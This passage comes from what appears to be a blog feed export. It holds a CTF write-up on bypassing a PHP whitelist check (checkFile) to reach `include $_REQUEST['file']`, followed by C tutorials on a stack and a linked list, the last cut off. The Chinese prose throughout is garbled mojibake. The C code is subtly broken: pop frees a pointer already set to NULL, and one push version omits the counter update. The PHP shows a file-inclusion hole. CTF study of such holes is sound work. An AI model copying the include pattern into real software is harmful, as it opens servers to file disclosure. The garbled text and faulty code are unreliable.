class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;$page</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¼€å§‹ä»£ç å®¡è®¡</p><p>ç½‘é¡µé€šè¿‡å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œè¿‡æ»¤åè¿›è¡Œæ–‡ä»¶åŒ…å«</p><p>ä¸€å¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯éœ€è¦æ»¡è¶³æ‰€æœ‰çš„æ¡ä»¶ï¼Œä½†æ ¹æ®ä¸‹æ–‡åŒ…å«æ–‡ä»¶çš„ä»£ç å‘ç°åªéœ€è¦æ»¡è¶³å…¶ä¸­ä¸€ä¸ªå°±è¶³å¤Ÿäº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br></pre></td></tr></table></figure><p>åœ¨å°è¯•äº†è®¸ä¹…ä¹‹åæˆ‘å‘ç°é‡ç‚¹åœ¨äºæœ€åä¸€ä¸ªåˆ¤æ–­ï¼Œå³ä»è§£ç å‡½æ•°å¼€å§‹çš„åˆ¤æ–­ï¼›åœ¨è§£ç ä¹‹åå‡ºç°äº†æ–°çš„å˜é‡$_pageï¼Œç„¶åå¯¹è¯¥å˜é‡è¿›è¡Œåˆ†å‰²ï¼Œå–å‡ºå˜é‡ä¸­é—®å·ä¹‹å‰çš„éƒ¨åˆ†ï¼Œè¦†ç›–åŸæ¥çš„å˜é‡ï¼Œå†åˆ¤æ–­è¯¥å˜é‡æ˜¯å¦ä½äºç™½åå•å†…ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­é€šè¿‡åå¯¹æ–‡ä»¶è¿›è¡ŒåŒ…å«ï¼Œè¿™æ—¶éå†æ–‡ä»¶ç›®å½•å°±èƒ½æ‰¾åˆ°flagäº†ï¼Œæ–‡ä»¶åç§°åœ¨hint.phpé‡Œ</p><p>æœ€ç»ˆpayloadï¼š</p><p><a href="https://www.helloimg.com/image/Chigu0"><img src="https://www.helloimg.com/images/2021/11/07/Chigu0.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/07/Chigu0.png" srcset="data:image/png;base64,666" alt="Chigu0.png"></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä½¿ç”¨Cè¯­è¨€å®ç°æ ˆ</title>
      <link href="2021/09/05/stack_by_C/"/>
      <url>2021/09/05/stack_by_C/</url>
      
        <content type="html"><![CDATA[<h2>è¯´æ˜</h2><ul>    <li>ä½œä¸ºæ ˆé¡¶çš„èŠ‚ç‚¹ä¸å­˜å‚¨æ•°æ®<a id="more"></a>ï¼Œä»…ä½œå®šä½åŠŸèƒ½</li>    <li>æ•°æ®é¡¹çš„ç±»å‹å¯è‡ªè¡Œå®šä¹‰</li>    <li>åœ¨pushå’Œpopæ—¶ï¼Œå¹¶ä¸æ”¹å˜æ ˆé¡¶èŠ‚ç‚¹çš„ä½ç½®ï¼Œä»…ä»…æ˜¯å°†å¾…æ“ä½œèŠ‚ç‚¹åŠ å…¥æˆ–åˆ é™¤å¹¶æ”¹å˜æŒ‡é’ˆæŒ‡å‘è€Œå·²</li>    <li>æ ˆé¡¶èŠ‚ç‚¹çš„æ•°æ®é¡¹å¯ç”¨æ¥å­˜å‚¨å½“å‰æ ˆçš„èŠ‚ç‚¹æ•°ï¼Œè¿™ç‚¹åœ¨pushå‡½æ•°çš„å®šä¹‰ä¸­å¯ä»¥ä½“ç°</li>    <li>ä¸»å‡½æ•°ä»…ä½œå„å‡½æ•°çš„æ¼”ç¤ºä½¿ç”¨ï¼Œå¯è‡ªå®šä¹‰</li></ul><h2>å®šä¹‰ç›¸åº”ç»“æ„</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;node;</span><br></pre></td></tr></table></figure><p>è¯¥ç»“æ„ç”±ä¸€ä¸ªæ•´å‹å’Œä¸€ä¸ªæŒ‡å‘æ­¤ç»“æ„çš„æŒ‡é’ˆç»„æˆã€‚</p><h2>å®šä¹‰pushå‡½æ•°</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">push</span><span class="params">(node *top, <span class="keyword">int</span> data)</span></span>&#123;</span><br><span class="line">node *temp = (node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">temp-&gt;data = data;</span><br><span class="line">temp-&gt;next = top-&gt;next;</span><br><span class="line">top-&gt;next = temp;</span><br><span class="line">    top-&gt;data++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul>    <li>ç¬¬ä¸€æ­¥ï¼šåˆ†é…ç©ºé—´</li>    <li>ç¬¬äºŒæ­¥ï¼šå­˜å‚¨æ•°æ®</li>    <li>ç¬¬ä¸‰æ­¥ï¼šæ”¹å˜æ ˆé¡¶å’Œæ–°å¢é¡¹çš„nextæŒ‡é’ˆï¼Œé€’å¢topèŠ‚ç‚¹çš„dataé¡¹</li></ul><h2>å®šä¹‰popå‡½æ•°</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pop</span><span class="params">(node *top)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!top-&gt;next)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stack is empty now.&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> pop_data = top-&gt;next-&gt;data;</span><br><span class="line">node *temp = top-&gt;next;</span><br><span class="line">top-&gt;next = top-&gt;next-&gt;next;</span><br><span class="line">temp = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">free</span>(temp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> pop_data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul>    <li>ç¬¬ä¸€æ­¥ï¼šåˆ¤æ–­æ ˆæ˜¯å¦ä¸ºç©º</li>    <li>ç¬¬äºŒæ­¥ï¼šå®šä¹‰å˜é‡å­˜å‚¨å¾…å¼¹å‡ºçš„æ•°æ®å’Œå¾…åˆ é™¤èŠ‚ç‚¹</li>    <li>ç¬¬ä¸‰æ­¥ï¼šæ”¹å˜æ ˆé¡¶çš„nextæŒ‡é’ˆ</li>    <li>é‡Šæ”¾å¾…åˆ é™¤èŠ‚ç‚¹ç©ºé—´ï¼Œåˆ é™¤èŠ‚ç‚¹</li></ul><h2>å®šä¹‰åˆå§‹åŒ–å‡½æ•°</h2><ul>    <li>ä¸ºæ ˆé¡¶èŠ‚ç‚¹åˆ†é…ç©ºé—´å¹¶åˆå§‹åŒ–æŒ‡é’ˆä¸ºç©º</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">node* <span class="title">stack_init</span><span class="params">()</span></span>&#123;</span><br><span class="line">node *temp = (node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">temp-&gt;data = <span class="number">0</span>;</span><br><span class="line">temp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2>å®šä¹‰éå†æ˜¾ç¤ºå‡½æ•°</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">(node *current)</span></span>&#123;</span><br><span class="line">current = current-&gt;next;</span><br><span class="line"><span class="keyword">while</span>(current)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,current-&gt;data);</span><br><span class="line">current = current-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul>    <li>å°†å½“å‰èŠ‚ç‚¹æŒ‡å‘æ ˆé¡¶çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹</li>    <li>å½“å‰èŠ‚ç‚¹ä¸ä¸ºç©ºæ—¶è¿›å…¥éå†å¾ªç¯</li>    <li>æ‰“å°å½“å‰èŠ‚ç‚¹çš„æ•°æ®é¡¹</li>    <li>å°†å½“å‰èŠ‚ç‚¹æŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹</li></ul><h2>æºä»£ç </h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">push</span><span class="params">(node *top, <span class="keyword">int</span> data)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pop</span><span class="params">(node *top)</span></span>;</span><br><span class="line"><span class="function">node* <span class="title">stack_init</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">(node *current)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">push</span><span class="params">(node *top, <span class="keyword">int</span> data)</span></span>&#123;</span><br><span class="line">node *temp = (node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">temp-&gt;data = data;</span><br><span class="line">temp-&gt;next = top-&gt;next;</span><br><span class="line">top-&gt;next = temp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pop</span><span class="params">(node *top)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!top-&gt;next)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stack is empty now.&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> pop_data = top-&gt;next-&gt;data;</span><br><span class="line">node *temp = top-&gt;next;</span><br><span class="line">top-&gt;next = top-&gt;next-&gt;next;</span><br><span class="line">temp = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">free</span>(temp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> pop_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">node* <span class="title">stack_init</span><span class="params">()</span></span>&#123;</span><br><span class="line">node *temp = (node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">temp-&gt;data = <span class="number">0</span>;</span><br><span class="line">temp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">(node *current)</span></span>&#123;</span><br><span class="line">current = current-&gt;next;</span><br><span class="line"><span class="keyword">while</span>(current)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,current-&gt;data);</span><br><span class="line">current = current-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> first_input;</span><br><span class="line"><span class="keyword">int</span> pop_input, pop_data;</span><br><span class="line">node *top = stack_init();</span><br><span class="line"><span class="keyword">int</span> status;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter strings, Ctrl+Z to quit.\n&quot;</span>);</span><br><span class="line">status = <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;first_input);</span><br><span class="line"><span class="keyword">while</span>(status!=EOF)&#123;</span><br><span class="line">push(top, first_input);</span><br><span class="line">status = <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;first_input);</span><br><span class="line">&#125;</span><br><span class="line">display(top);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now enter 1 to pop data, 0 to quit.\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;pop_input);</span><br><span class="line"><span class="keyword">while</span>(pop_input==<span class="number">1</span>)&#123;</span><br><span class="line">pop_data = pop(top);</span><br><span class="line"><span class="keyword">if</span>(pop_data==<span class="number">-1</span>)&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pop_data: %d\n&quot;</span>,pop_data);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;pop_input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nDone\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> çŸ¥è¯†è¾“å‡º </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä½¿ç”¨Cè¯­è¨€å®ç°é“¾è¡¨</title>
      <link href="2021/05/02/link_list_by_C/"/>
      <url>2021/05/02/link_list_by_C/</url>
      
        <content type="html"><![CDATA[<h2>ç¬¬ä¸€æ­¥ï¼šå®šä¹‰ç›¸åº”ç»“æ„</h2><p>ç”±äºå®ç°é“¾è¡¨çš„ç¼–ç¨‹è¯­è¨€ä¸ºCï¼Œä¸èƒ½å¤Ÿä½¿ç”¨ç±»ï¼Œæ•…ä½¿ç”¨ç»“æ„æ¥å®ç°é“¾è¡¨ä¸­çš„èŠ‚ç‚¹ï¼›</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LinkList</span> &#123;</span></span><br><span class="line"><span class="keyword">char</span> name[MAX_INPUT];</span><br><span class="line"><span class="keyword">long</span> number;</span><br><span class="line">LinkList* next;</span><br><span class="line">&#125;Link;</span><br></pre></td></tr></table></figure><p>è¯¥ç»“æ„ç”±ä¸€ä¸ªå­—ç¬¦æ•°ç»„ï¼Œä¸€é¡¹ç¼–å·å’Œä¸€ä¸ªæŒ‡å‘æ­¤ç»“æ„çš„æŒ‡é’ˆç»„æˆã€‚</p><h2>ç¬¬äºŒæ­¥ï¼šå®šä¹‰è¾“å…¥å‡½æ•°</h2><p>ä¸ºäº†æ›´å®¹æ˜“ã€æ›´å‡†ç¡®çš„è·å–è¾“å…¥ï¼Œåœ¨ç¨‹åºä¸­é‡æ–°å®šä¹‰è¾“å…¥å‡½æ•°ï¼Œåœ¨åŸæœ‰fgets()å‡½æ•°çš„åŸºç¡€ä¸Šç•¥ä½œä¿®æ”¹ï¼Œå¾—åˆ°æ–°çš„è¾“å…¥å‡½æ•°s_gets()ï¼›</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">s_gets</span><span class="params">(<span class="keyword">char</span>* st, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span>* ret_val;</span><br><span class="line"><span class="keyword">char</span>* find;</span><br><span class="line">ret_val = fgets(st, n, <span class="built_in">stdin</span>);</span><br><span class="line"><span class="keyword">if</span> (ret_val) &#123;</span><br><span class="line">find = <span class="built_in">strchr</span>(st, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (find) &#123;</span><br><span class="line">*find = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">while</span> (getchar() != <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret_val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°ä¸ºè¿”å›ç±»å‹ä¸ºå­—ç¬¦æŒ‡é’ˆã€æ¥å—å‚æ•°ä¸ºä¸€ä¸ªå­—ç¬¦æŒ‡é’ˆå’Œä¸€ä¸ªæ•´æ•°çš„è¾“å…¥å‡½æ•°ï¼Œå…¶ä¸­å­—ç¬¦æŒ‡é’ˆå°±æ˜¯å­—ç¬¦æ•°ç»„åç§°ï¼Œå› ä¸ºæ•°ç»„åç§°æœ¬è´¨ä¸Šå°±æ˜¯æ•°ç»„é¦–å…ƒç´ çš„åœ°å€ï¼Œè€Œè¯¥æ•°ç»„ä¸ºå­—ç¬¦æ•°ç»„ï¼Œæ•…è¯¥å­—ç¬¦æ•°ç»„åç§°æœ¬è´¨ä¸Šå°±æ˜¯å­—ç¬¦æŒ‡é’ˆï¼›</p><p>åœ¨å‡½æ•°å†…éƒ¨ï¼Œæˆ‘å£°æ˜äº†ä¸¤ä¸ªå­—ç¬¦æŒ‡é’ˆï¼Œä¸€ä¸ªç”¨æ¥æ¥å—<a href="https://baike.baidu.com/item/fgets">fgets</a>å‡½æ•°çš„è¿”å›å€¼ï¼Œä¸€ä¸ªç”¨æ¥æ¥å—æŸ¥æ‰¾å­—ç¬¦å‡½æ•°(<a href="https://baike.baidu.com/item/strchr">strchr</a>)çš„è¿”å›å€¼ï¼›</p><p>å…³äºfgets()å‡½æ•°ï¼š</p><ul>    <li>å¦‚æœæ¥å—è¾“å…¥çš„å­—ç¬¦æ•°é‡è¶…è¿‡å­—ç¬¦æ•°ç»„çš„å¤§å°(MAX_INPUT)ï¼Œfgets()å‡½æ•°ä¼šè¿”å›å…ˆå‰ä¼ å…¥çš„åœ°å€ï¼Œå³å­—ç¬¦æ•°ç»„çš„åç§°ï¼Œå¹¶ä¸”æŠŠæœ«å°¾çš„å­—ç¬¦æ¢ä¸ºç©ºå­—ç¬¦('\0')ï¼Œä½¿ä¹‹æˆä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼›</li>    <li>å¦‚æœæ¥æ”¶è¾“å…¥çš„å­—ç¬¦æ•°é‡åœ¨å­—ç¬¦æ•°ç»„çš„å¤§å°ä»¥å†…ï¼Œé‚£ä¹ˆfgets()å‡½æ•°ä¼šå°†ç©ºå­—ç¬¦æ”¾ç½®åœ¨æ¢è¡Œç¬¦ä¹‹å‰ï¼Œç„¶ååŒæ ·è¿”å›å…ˆå‰ä¼ å…¥çš„åœ°å€ï¼›</li>    <li>éœ€è¦æ³¨æ„çš„æ˜¯ï¼šfgets()å‡½æ•°åœ¨é‡åˆ°æ–‡ä»¶ç»“å°¾(EOF End Of File)æ—¶å°†ä¼šè¿”å›ä¸€ä¸ªç©ºæŒ‡é’ˆï¼›</li></ul><p>å…³äºstrchr()å‡½æ•°ï¼š</p><ul>    <li>åœ¨æŸä¸ªå­—ç¬¦æ•°ç»„ä¸­æŸ¥æ‰¾æŸå­—ç¬¦ï¼Œå¹¶è¿”å›æŒ‡å‘è¯¥å­—ç¬¦çš„æŒ‡é’ˆ</li>    <li>rå¦‚æœå­—ç¬¦ä¸²ä¸­ä¸åŒ…å«è¯¥å­—ç¬¦ï¼Œåˆ™è¿”å›ä¸€ä¸ªç©ºæŒ‡é’ˆ</li></ul><p>ç»è¿‡é‡å†™ï¼Œä¿®æ”¹å¦‚ä¸‹ï¼š</p><p>é¦–å…ˆä½¿ç”¨fgets()å‡½æ•°æ¥æ”¶è¾“å…¥ï¼Œå¹¶å°†è¿”å›å€¼å­˜å‚¨åœ¨æŒ‡é’ˆret_valä¸­ï¼Œç„¶åå¯¹è¯¥æŒ‡é’ˆè¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœä¸ä¸ºç©ºæŒ‡é’ˆï¼Œåˆ™ä½¿ç”¨å­—ç¬¦æŸ¥æ‰¾å‡½æ•°æŸ¥æ‰¾æ¢è¡Œç¬¦ï¼Œå¹¶å°†è¯¥æ¢è¡Œç¬¦æ›¿æ¢ä¸ºç©ºå­—ç¬¦ï¼Œå¦‚æœæŸ¥æ‰¾æ¢è¡Œç¬¦å¤±è´¥ï¼Œè¯´æ˜è¾“å…¥çš„å­—ç¬¦æ•°é‡è¶…è¿‡äº†å­—ç¬¦æ•°ç»„çš„å¤§å°ï¼Œè¿™æ—¶ä½¿ç”¨ä¸€ä¸ªwhileå¾ªç¯æ¥æ”¶å…¶ä½™çš„è¾“å…¥å¹¶æŠ›å¼ƒï¼›å¦‚æœret_valä¸ºç©ºæŒ‡é’ˆï¼Œè¯´æ˜é‡åˆ°æ–‡ä»¶ç»“å°¾ï¼›æœ€åè¿”å›ret_valï¼›</p><h2>ç¬¬ä¸‰æ­¥ï¼šç¼–å†™ä¸»å‡½æ•°è¿›è¡Œæµ‹è¯•</h2><figure class="highlight c"><table><tr><td 